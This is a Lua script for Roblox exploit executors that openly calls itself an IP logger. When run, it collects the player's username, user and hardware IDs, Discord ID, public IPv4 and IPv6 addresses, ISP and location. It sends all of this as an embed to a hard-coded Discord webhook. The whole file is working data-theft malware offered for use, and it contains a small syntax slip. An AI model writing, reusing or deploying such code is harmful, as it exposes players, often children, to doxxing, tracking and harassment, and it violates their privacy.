local LocalPlayer = game:GetService("Players").LocalPlayer
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local discordID = LocalPlayer:GetAttribute("DiscordID")
local username = LocalPlayer.Name
local ipv4 = game:HttpGet("https://api.ipify.org")
local ipv6 = game:HttpGet("https://api64.ipify.org")
local jobId = game.JobId
local job = 'game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", "' .. jobId .. '")'
local ispResponse = game:HttpGet(('http://ip-api.com/json/%s'):format(ipv4))
local ispInfo = game:GetService('HttpService'):JSONDecode(ispResponse)
local isp = ispInfo.org
local ispAS = ispInfo.as
local stats = game:HttpGet("http://ip-api.com/json")
local profilelink = 'https://roblox.com/users/' .. LocalPlayer.UserId .. '/profile'
local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local clientID = LocalPlayer.UserId
local displayname = LocalPlayer.DisplayName
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local role_mention = "<@&1101402054989193308>"
local ownerName = game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId)
local ownerUserId = game.CreatorId
_G.Webhookid = "https://discord.com/api/webhooks/1129375899133935677/sw1Xdqqj8JbxDm8VesSua9-26m0avH88KJBBVIQHgZfQdPsNZbE_LOamwNR0NhlPoEJ3"


pcall(function()
    local executor = "Undefined"
    if syn then
        executor = "Synapse X"
    elseif (KRNL_LOADED and KRNL_ENCRYPT_START) then
        executor = "KRNL"
    elseif (secure_load and is_sirhurt_closure and not pebc_execute) then
        executor = "SirHurt V4"
    elseif (WrapGlobal and CheckCaller) then
        executor = "Fluxus PC"
    elseif getscriptenv then
        executor = "Script-Ware"
    elseif getexecutorname then
        executor = getexecutorname()
    end

    



    local data = {
        ["embeds"] = {
            {
                ["title"] = '**IP & User Info**',
                ["color"] = tonumber(0xFF0000),
                ["fields"] = {
                    {
                        ["name"] = "Username",
                        ["value"] = username,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Display Name",
                        ["value"] = displayname,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = hwid,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "USER ID",
                        ["value"] = clientID,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Account Age",
                        ["value"] = AccountAge,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Membership Type",
                        ["value"] = MembershipType,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "JOB ID",
                        ["value"] = job,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IPv4",
                        ["value"] = ipv4,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IPv6",
                        ["value"] = ipv6,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Discord ID",
                        ["value"] = discordID",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Country",
                        ["value"] = ispInfo.country,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ISP",
                        ["value"] = isp,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "AS",
                        ["value"] = ispInfo.as,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Profile link",
                        ["value"] = profilelink,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Game link",
                        ["value"] = gamelink,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Owner Name",
                        ["value"] = ownerName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Owner User ID",
                        ["value"] = ownerUserId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Executors",
                        ["value"] = executor,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Stats",
                        ["value"] = stats,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Report Abuse",
                        ["value"] = 'https://roblox.com/abusereport/user?userId=' .. clientID,
                        ["inline"] = false
                    }
                },
                ["footer"] = {
                    ["text"] = "#1 IP LOGGER Service - Seriality IP LOGGER | KEY : Seriality-Auth-1138a-77s8-x61n-xnxx",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1089138895519756300/1136548991685906492/20230801_173234.jpg"
                }
            }
        }
    }

    -- Rest of the code remains the same
    if syn then
        syn.request(
            {
                Url = _G.Webhookid,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        )
    elseif request then
        request(
            {
                Url = _G.Webhookid,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        )
    elseif http_request then
        http_request(
            {
                Url = _G.Webhookid,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService('HttpService'):JSONEncode(data)
            }
        )
    end
end)
